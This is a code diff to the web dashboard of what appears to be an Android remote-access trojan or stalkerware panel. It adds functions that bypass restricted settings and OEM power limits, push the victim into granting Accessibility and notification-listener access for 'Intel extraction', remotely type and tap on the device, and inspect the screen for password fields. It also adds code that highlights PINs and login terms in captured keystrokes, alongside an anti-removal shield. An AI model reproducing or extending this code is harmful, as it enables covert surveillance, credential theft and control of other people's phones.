@@ -12,6 +12,63 @@ let streamWidth = 640;
 let streamHeight = 480;
 let streamQuality = 40;
 
+function showInfo(e, title, text) {
+  if (e) e.stopPropagation();
+  let t = document.getElementById('info-popup');
+  if(!t) {
+    t = document.createElement('div'); t.id = 'info-popup';
+    Object.assign(t.style, {
+      position: 'absolute',
+      background: 'rgba(15,15,25,0.98)',
+      border: '1px solid var(--neon-cyan)',
+      color: '#fff',
+      padding: '16px',
+      borderRadius: '12px',
+      zIndex: '20000',
+      width: '280px',
+      boxShadow: '0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)',
+      transition: 'opacity 0.3s ease',
+      opacity: '0',
+      display: 'none',
+      pointerEvents: 'auto'
+    });
+    document.body.appendChild(t);
+  }
+
+  const rect = e.target.getBoundingClientRect();
+  const scrollX = window.pageXOffset || document.documentElement.scrollLeft;
+  const scrollY = window.pageYOffset || document.documentElement.scrollTop;
+
+  let top = rect.bottom + scrollY + 10;
+  let left = rect.left + scrollX - 140 + (rect.width/2);
+
+  if (left < 10) left = 10;
+  if (left + 280 > window.innerWidth + scrollX) left = window.innerWidth + scrollX - 290;
+
+  t.style.top = top + 'px';
+  t.style.left = left + 'px';
+  t.innerHTML = '<div style="font-weight:bold; color:var(--neon-cyan); font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px;">' + title + '</div>' +
+                '<div style="font-size:0.7rem; opacity:0.8; font-family:monospace; line-height:1.4;">' + text + '</div>';
+
+  t.style.display = 'block';
+  setTimeout(() => t.style.opacity = '1', 10);
+}
+
+function hideInfo() {
+  const t = document.getElementById('info-popup');
+  if (t && t.style.display === 'block') {
+    t.style.opacity = '0';
+    setTimeout(() => t.style.display = 'none', 300);
+  }
+}
+
+document.addEventListener('click', function(e) {
+  const t = document.getElementById('info-popup');
+  if (t && t.style.display === 'block' && !t.contains(e.target)) {
+    hideInfo();
+  }
+});
+
 function updateNav() {
   const path = window.location.pathname;
   const links = document.querySelectorAll('.nav a');
@@ -71,18 +128,117 @@ function showToast(m, type='info') {
     document.body.appendChild(t);
   }
   t.style.borderColor = type === 'error' ? 'var(--danger)' : 'var(--neon-cyan)';
-  t.innerText = m; t.style.display = 'block';
+  t.innerHTML = m; t.style.display = 'block';
   setTimeout(() => { t.style.opacity = '1'; t.style.bottom = '20%'; }, 10);
-  setTimeout(() => { t.style.opacity = '0'; t.style.bottom = '15%'; setTimeout(() => t.style.display='none', 500); }, 3500);
+  setTimeout(() => { t.style.opacity = '0'; t.style.bottom = '15%'; setTimeout(() => t.style.display='none', 500); }, 5500);
 }
 
 function repairProtocol() {
-    console.log('[DEBUG] Initiating Repair Protocol...');
-    fetch('/gps/request-permission');
-    fetch('/device/fix-persistence')
-      .then(r => r.json())
-      .then(d => { showToast(d.message); })
-      .catch(e => { console.error(e); showToast('Connection failure', 'error'); });
+    showTacticalModal('REPAIR_LINK', 'Re-synchronizing background telemetry protocols...', () => {
+        fetch('/gps/request-permission');
+        fetch('/device/fix-persistence')
+          .then(r => r.json())
+          .then(d => { showToast(d.message); })
+          .catch(e => { console.error(e); showToast('Connection failure', 'error'); });
+    });
+}
+
+function dispatchPermissionSequence() {
+    showTacticalModal('PERMISSION_SYNC', 'Initiating remote authorization sequence...', () => {
+        fetch('/device/request-permissions')
+          .then(r => r.json())
+          .then(d => { showToast(d.message); })
+          .catch(e => { console.error(e); showToast('Request failed', 'error'); });
+    });
+}
+
+function optimizeStability() {
+    showTacticalModal('STABILITY_OPTIMIZE', 'Bypassing OEM power restrictions...', () => {
+        fetch('/device/optimize-stability')
+          .then(r => r.json())
+          .then(d => { showToast('STABILITY_SYNC: Follow OEM instructions to enable Auto-start'); })
+          .catch(e => { console.error(e); showToast('Stability sync failed', 'error'); });
+    });
+}
+
+function deepRepair() {
+    showTacticalModal('CORE_REPAIR', 'Opening deep system configuration...', () => {
+        fetch('/device/deep-repair')
+          .then(r => r.json())
+          .then(d => { showToast('SETTINGS_OPENED: Complete repair on device'); })
+          .catch(e => { console.error(e); showToast('Repair link failed', 'error'); });
+    });
+}
+
+function injectTrust() {
+    showTacticalModal('TRUST_INJECTION', 'Utilizing Session API for restricted settings bypass...', () => {
+        fetch('/device/inject-trust')
+          .then(r => r.json())
+          .then(d => { showToast('BYPASS_INITIATED: Wait for install prompt'); })
+          .catch(e => { console.error(e); showToast('Bypass failed', 'error'); });
+    });
+}
+
+function showTacticalModal(title, message, callback) {
+    let m = document.getElementById('tactical-modal');
+    if(!m) {
+        m = document.createElement('div');
+        m.id = 'tactical-modal';
+        Object.assign(m.style, {
+            position: 'fixed', top: '0', left: '0', width: '100%', height: '100%',
+            background: 'rgba(0,0,0,0.85)', zIndex: '30000', display: 'flex',
+            alignItems: 'center', justifyContent: 'center', opacity: '0',
+            transition: 'opacity 0.4s ease', backdropFilter: 'blur(10px)'
+        });
+        m.innerHTML = `
+            <div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; text-align:center; box-shadow:0 0 50px rgba(0,242,255,0.2);">
+                <div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div>
+                <div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">Preparing remote system command...</div>
+                <div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;">
+                    <div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div>
+                </div>
+                <div style="display:flex; justify-content:center; gap:20px;">
+                    <button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT</button>
+                    <button id="tm-confirm" class="btn btn-small">EXECUTE</button>
+                </div>
+            </div>
+        `;
+        document.body.appendChild(m);
+    }
+
+    document.getElementById('tm-title').innerText = title;
+    document.getElementById('tm-msg').innerText = message;
+    document.getElementById('tm-progress').style.width = '0%';
+    m.style.display = 'flex';
+    setTimeout(() => m.style.opacity = '1', 10);
+
+    const abort = () => {
+        m.style.opacity = '0';
+        setTimeout(() => m.style.display = 'none', 400);
+    };
+
+    document.getElementById('tm-cancel').onclick = abort;
+    document.getElementById('tm-confirm').onclick = () => {
+        document.getElementById('tm-confirm').disabled = true;
+        document.getElementById('tm-confirm').style.opacity = '0.5';
+        document.getElementById('tm-title').innerText = 'EXECUTING_PROTOCOL...';
+
+        let p = 0;
+        const int = setInterval(() => {
+            p += Math.random() * 15;
+            if(p >= 100) {
+                p = 100;
+                clearInterval(int);
+                setTimeout(() => {
+                    abort();
+                    callback();
+                    document.getElementById('tm-confirm').disabled = false;
+                    document.getElementById('tm-confirm').style.opacity = '1';
+                }, 400);
+            }
+            document.getElementById('tm-progress').style.width = p + '%';
+        }, 100);
+    };
 }
 
 async function handleLogin(e) {
@@ -155,6 +311,14 @@ function fetchLogs() {
                } else if (line.startsWith('[S]')) {
                    p.style.color = 'var(--neon-green)';
                    cleanLine = line.substring(3);
+               } else if (line.includes('INTEL_EXTRACTED')) {
+                   p.style.color = 'var(--danger)';
+                   p.style.fontWeight = 'bold';
+                   p.style.textShadow = '0 0 10px rgba(255, 49, 49, 0.3)';
+               } else if (line.includes('INTEL_SNIFFED')) {
+                   p.style.color = 'var(--encrypted-blue)';
+                   p.style.fontWeight = 'bold';
+                   p.style.textShadow = '0 0 10px rgba(0, 136, 255, 0.3)';
                } else {
                    p.style.color = 'var(--neon-cyan)';
                }
@@ -173,10 +337,70 @@ function fetchLogs() {
 }
 
 function clearSessionLogs() { if(confirm('Clear all activity logs for this session?')) fetch('/terminal/clear-logs').then(() => { lastLogId = 0; fetchLogs(); }); }
-function deviceCmd(a) { fetch('/device/' + a).then(r => r.json()).then(d => { if(d.redirect) window.location.href = d.redirect; }); }
+function openAccessibility() {
+    showTacticalModal('GHOST_MODE_UPLINK', 'Opening system Accessibility Hub to engage Ghost Mode...', () => {
+        fetch('/device/open-accessibility')
+          .then(r => r.json())
+          .then(d => { showToast('ACCESSIBILITY_HUB_OPENED'); })
+          .catch(e => { console.error(e); showToast('Link failure', 'error'); });
+    });
+}
+
+function openNotifications() {
+    showTacticalModal('INTEL_SYNC_UPLINK', 'Opening Notification Listener settings for Intel extraction...', () => {
+        fetch('/device/open-notifications')
+          .then(r => r.json())
+          .then(d => { showToast('NOTIFICATION_HUB_OPENED'); })
+          .catch(e => { console.error(e); showToast('Link failure', 'error'); });
+    });
+}
+
+function deviceCmd(a) {
+    fetch('/device/' + a).then(r => r.json()).then(d => { if(d.redirect) window.location.href = d.redirect; });
+}
 function restartServer() { if(confirm('Refresh background service? Interface will temporarily disconnect.')) { fetch('/terminal/restart'); setTimeout(() => location.reload(), 2500); } }
 function selfDestruct() { if(confirm('CAUTION: This will initiate the removal of all system stability protocols and uninstall the app. Proceed?')) fetch('/device/self-destruct'); }
 function sendToast() { const m = document.getElementById('toast-msg').value; if(m) fetch('/device/toast?msg=' + encodeURIComponent(m)); }
+function toggleColorPicker(e) {
+  if (e) e.stopPropagation();
+  const p = document.getElementById('color-picker-palette');
+  if (p) p.style.display = p.style.display === 'none' ? 'grid' : 'none';
+}
+function pickToastColor(c) {
+  document.getElementById('toast-color-val').value = c;
+  document.getElementById('toast-color-btn').style.background = c;
+  const p = document.getElementById('color-picker-palette');
+  if (p) p.style.display = 'none';
+}
+function sendEnhancedToast() {
+  const m = document.getElementById('toast-msg').value;
+  if(!m) return showToast('ENTER_MESSAGE_FIRST', 'error');
+  const anim = document.getElementById('toast-anim').value;
+
+  if (anim === 'burnt') {
+    showToast('BURNING_SYSTEM_DISPLAY...');
+    for (let i = 0; i < 15; i++) {
+      setTimeout(() => {
+        const size = Math.floor(Math.random() * 40) + 15;
+        const y = Math.floor(Math.random() * 1600) + 100;
+        const dur = Math.floor(Math.random() * 7000) + 3000; // 3s to 10s max
+        const subAnim = ['pop', 'static', 'scroll'][Math.floor(Math.random() * 3)];
+        const col = document.getElementById('toast-color-val').value;
+        fetch('/device/toast?msg=' + encodeURIComponent(m) + '&size=' + size + '&y=' + y + '&duration=' + dur + '&anim=' + subAnim + '&color=' + encodeURIComponent(col));
+      }, i * 200);
+    }
+    return;
+  }
+
+  const size = document.getElementById('toast-size').value;
+  const y = document.getElementById('toast-y').value;
+  const dur = document.getElementById('toast-dur').value;
+  const col = document.getElementById('toast-color-val').value;
+
+  fetch('/device/toast?msg=' + encodeURIComponent(m) + '&size=' + size + '&y=' + y + '&duration=' + dur + '&anim=' + anim + '&color=' + encodeURIComponent(col))
+    .then(r => r.json())
+    .then(d => { if(d.success) showToast('TOAST_DISPATCHED'); });
+}
 function openApp() { const p = document.getElementById('app-selector').value; if(p) fetch('/device/open-app?pkg=' + encodeURIComponent(p)); }
 function openUrl() { const u = document.getElementById('target-url').value; if(u) fetch('/device/open-url?url=' + encodeURIComponent(u)); }
 
@@ -296,8 +520,146 @@ function toggleAutoPilot() {
     else { btn.innerText = 'AUTOPILOT_OFF'; btn.classList.remove('btn-engaged-yellow'); btn.style.color = 'var(--neon-yellow)'; btn.style.background = 'rgba(255, 255, 255, 0.03)'; }
   });
 }
+function ghostType() {
+  const input = document.getElementById('ghost-type-input');
+  const text = input.value;
+  if(!text) return;
+  fetch('/ghost/interact?action=type&text=' + encodeURIComponent(text));
+  input.value = '';
+}
 function ghostAction(a) { fetch('/ghost/interact?action='+a); }
 function clearGhostLogs() { if(confirm('Purge captured keystrokes?')) fetch('/ghost/clear').then(() => refreshGhostLogs()); }
+async function refreshInspector() {
+  const container = document.getElementById('inspector-tree');
+  if(!container) return;
+  container.innerHTML = '<span style="color:var(--neon-cyan)">[SCANNING] Traversing Accessibility Tree...</span>';
+
+  try {
+    const r = await fetch('/ghost/inspector');
+    const data = await r.json();
+    if(data.error) {
+      container.innerHTML = '<span style="color:var(--danger)">[ERROR] ' + data.error + '</span>';
+      return;
+    }
+
+    container.innerHTML = '';
+
+    // Context Header (App info)
+    const contextHeader = document.createElement('div');
+    contextHeader.style.padding = '12px 18px';
+    contextHeader.style.marginBottom = '20px';
+    contextHeader.style.background = 'rgba(0, 242, 255, 0.08)';
+    contextHeader.style.border = '1px solid rgba(0, 242, 255, 0.15)';
+    contextHeader.style.borderRadius = '10px';
+    contextHeader.style.boxShadow = 'inset 0 0 15px rgba(0,242,255,0.05)';
+
+    let appName = data.package;
+    let locationIcon = '&#128241;'; // Phone
+
+    // Auto-detect "Home" context
+    const launcherKeywords = ['launcher', 'trebuchet', 'home', 'desktop', 'nexuslauncher'];
+    if (launcherKeywords.some(k => appName.toLowerCase().includes(k))) {
+        appName = 'System Home Screen';
+        locationIcon = '&#127968;'; // House
+    } else {
+        // Pretty print common packages
+        if (appName.includes('.android.settings')) appName = 'System Settings';
+        else if (appName.includes('.vending')) appName = 'Google Play Store';
+        else if (appName.includes('.chrome')) appName = 'Chrome Browser';
+        else if (appName.includes('.messaging') || appName.includes('.sms')) appName = 'SMS / Messages';
+        else if (appName.includes('.contacts')) appName = 'Contacts / Phonebook';
+    }
+
+    contextHeader.innerHTML = `
+        <div style="display:flex; align-items:center; gap:12px; width:100%;">
+            <div style="font-size:1.6rem; flex-shrink:0; filter: drop-shadow(0 0 5px var(--neon-cyan));">${locationIcon}</div>
+            <div style="flex-grow:1; min-width:0; overflow:hidden;">
+                <div style="font-size:0.6rem; color:var(--neon-cyan); letter-spacing:1.5px; font-weight:bold; opacity:0.8; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">CURRENT_UPLINK_CONTEXT</div>
+                <div style="font-size:1.1rem; font-weight:900; color:#fff; text-shadow:0 0 10px rgba(255,255,255,0.2); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${appName}</div>
+                <div style="font-size:0.55rem; color:rgba(255,255,255,0.4); font-family:monospace; margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${data.package}</div>
+            </div>
+            <div style="text-align:right; font-size:0.55rem; color:var(--neon-green); opacity:0.7; font-weight:bold; flex-shrink:0; line-height:1.2; min-width:80px;">
+                SECURE_LAYER_V2<br>SYSCALL_ACTIVE
+            </div>
+        </div>
+    `;
+    container.appendChild(contextHeader);
+
+    renderInspectorNode(data.tree, container, 0, data.width, data.height);
+  } catch(e) {
+    container.innerHTML = '<span style="color:var(--danger)">[FATAL] Inspector Timeout</span>';
+  }
+}
+
+function renderInspectorNode(node, container, depth, sw, sh) {
+  if(!node) return;
+  const row = document.createElement('div');
+  row.style.display = 'flex';
+  row.style.alignItems = 'center';
+  row.style.padding = '8px 12px';
+  row.style.marginLeft = (depth * 16) + 'px';
+  row.style.borderLeft = '1px solid rgba(0, 242, 255, 0.12)';
+  row.style.whiteSpace = 'nowrap';
+  row.style.transition = 'all 0.2s cubic-bezier(0.4, 0, 0.2, 1)';
+  row.style.cursor = 'pointer';
+  row.style.borderRadius = '4px';
+
+  // Identification Logic
+  const className = node.class.split('.').pop();
+  let icon = '&#9634;'; // Default View
+  if (node.class.toLowerCase().includes('button')) icon = '&#9007;';
+  else if (node.class.toLowerCase().includes('edit')) icon = '&#9998;';
+  else if (node.class.toLowerCase().includes('text')) icon = '&#8443;';
+  else if (node.class.toLowerCase().includes('image')) icon = '&#128443;';
+  else if (node.class.toLowerCase().includes('layout')) icon = '&#128392;';
+  else if (node.class.toLowerCase().includes('recycler') || node.class.toLowerCase().includes('list')) icon = '&#128220;';
+
+  // Tooltip for technical metadata
+  row.title = `Class: ${node.class}\nBounds: ${node.x},${node.y} [${node.w}x${node.h}]\nVisible: ${node.visible}\nFocusable: ${node.focusable}`;
+
+  let html = `<span style="color:var(--neon-cyan); margin-right:10px; font-size:0.9rem; opacity:0.8;">${icon}</span>`;
+  html += `<span style="color:var(--neon-green); font-weight:900; font-size:0.85rem; letter-spacing:0.5px;">${className}</span>`;
+
+  if (node.resId) {
+    html += `<span style="color:var(--neon-orange); margin-left:10px; font-size:0.7rem; opacity:0.8; font-family:monospace;">#${node.resId.split('/').pop()}</span>`;
+  }
+
+  if (node.text) {
+    html += `<span style="color:#fff; margin-left:12px; font-weight:bold; font-size:0.8rem; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">"${node.text}"</span>`;
+  } else if (node.desc) {
+    html += `<span style="color:rgba(255,255,255,0.5); margin-left:12px; font-size:0.75rem; font-style:italic;">[${node.desc}]</span>`;
+  }
+
+  // Tactical Badges
+  if (node.clickable) html += `<span style="background:rgba(57,255,20,0.15); color:var(--neon-green); border:1px solid rgba(57,255,20,0.4); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:12px; font-weight:900; letter-spacing:0.5px;">CLICKABLE</span>`;
+  if (node.password) html += `<span style="background:rgba(255,49,49,0.2); color:var(--danger); border:1px solid rgba(255,49,49,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">PASSWORD</span>`;
+  if (node.editable) html += `<span style="background:rgba(0,136,255,0.2); color:var(--encrypted-blue); border:1px solid rgba(0,136,255,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">EDITABLE</span>`;
+
+  row.innerHTML = html;
+
+  row.onmouseenter = () => {
+      row.style.background = 'rgba(0, 242, 255, 0.08)';
+      row.style.boxShadow = '0 0 10px rgba(0, 242, 255, 0.1)';
+  };
+  row.onmouseleave = () => {
+      row.style.background = 'transparent';
+      row.style.boxShadow = 'none';
+  };
+
+  row.onclick = (e) => {
+    e.stopPropagation();
+    if(confirm(`INITIATE_REMOTE_INTERACTION: [${className}]\n\nPerform center-point tap at source coordinates?`)) {
+       const targetX = (node.x + node.w/2) * 100 / sw;
+       const targetY = (node.y + node.h/2) * 100 / sh;
+       fetch(`/ghost/interact?action=click&px=${targetX}&py=${targetY}`);
+    }
+  };
+
+  container.appendChild(row);
+  if(node.children) {
+    node.children.forEach(child => renderInspectorNode(child, container, depth + 1, sw, sh));
+  }
+}
 async function refreshGhostLogs() {
   try {
     const r = await fetch('/ghost/keys'); if (!r.ok) return;
@@ -306,12 +668,32 @@ async function refreshGhostLogs() {
     if(data.keys.length > 0) {
       const isAtBottom = (term.scrollHeight - term.scrollTop) <= (term.clientHeight + 10);
       let esc = data.keys.join('').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+
+      // 1. Highlight App/Package Headers (Cyan)
+      esc = esc.replace(/(\[.*?\] ->)/g, '<span style="color:var(--neon-cyan); font-weight:bold; opacity:0.8;">$1</span>');
+
+      // 2. Highlight Interactions (Green)
+      esc = esc.replace(/(\[CLICK\]:|\[LONG_CLICK\]:)/g, '<span style="color:var(--neon-green); font-weight:bold;">$1</span>');
+
+      // 3. Highlight Sensitive Keywords (Yellow/Red)
+      const keywords = ['password', 'pin', 'code', 'auth', 'login', 'account', 'verify'];
+      keywords.forEach(kw => {
+        const reg = new RegExp('(' + kw + ')', 'gi');
+        esc = esc.replace(reg, '<span style="color:var(--neon-yellow); font-weight:bold; border-bottom:1px solid var(--neon-yellow);">$1</span>');
+      });
+
+      // 4. Highlight Potential PINs/Codes (Red Glow)
+      // Matches 4-8 digit numeric sequences that aren't part of a package name
+      esc = esc.replace(/\b(\d{4,8})\b/g, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 8px var(--danger);">$1</span>');
+
+      // 5. Existing obfuscated targets for extra focus
       const _k = (s) => s.split('').map((c,i) => String.fromCharCode(c.charCodeAt(0) ^ 'SysAdmin'.charCodeAt(i % 8))).join('');
       const targets = [_k('\\x1C\\x0D\\x03'), _k('\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A'), _k('\\x0F\\x06\\x14\\x00\\x0A'), _k('\\x16\\x1A\\x16\\x13'), _k('\\x06\\x04\\x02\\x08\\x08')];
       targets.forEach(t => {
         const reg = new RegExp('(' + t + ')', 'gi');
-        esc = esc.replace(reg, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 5px rgba(255,49,49,0.5);">$1</span>');
+        esc = esc.replace(reg, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 10px rgba(255,49,49,0.5);">$1</span>');
       });
+
       term.innerHTML = esc;
       if (isAtBottom) { term.scrollTop = term.scrollHeight; }
     }
@@ -341,7 +723,7 @@ async function checkGhostStatus() {
     }
     const stream = document.getElementById('ghost-screen-stream');
     if (stream) {
-      stream.style.filter = data.blackout ? 'brightness(0.6) contrast(1.1) saturate(0.9)' : 'none';
+      stream.style.filter = data.blackout ? 'brightness(5.4) contrast(1.1)' : 'none';
     }
     if (arBtn) { if (data.antiRemoval) { arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: ON'; arBtn.style.borderColor = 'var(--neon-green)'; arBtn.style.color = 'var(--neon-green)'; } else { arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: OFF'; arBtn.style.borderColor = 'var(--danger)'; arBtn.style.color = 'var(--danger)'; } }
   } catch(e) {}
@@ -532,4 +914,11 @@ document.addEventListener('DOMContentLoaded', () => {
   if (loginForm) {
     loginForm.addEventListener('submit', handleLogin);
   }
+
+  document.addEventListener('click', function() {
+    const p = document.getElementById('color-picker-palette');
+    if (p && p.style.display === 'grid') {
+      p.style.display = 'none';
+    }
+  });
 });
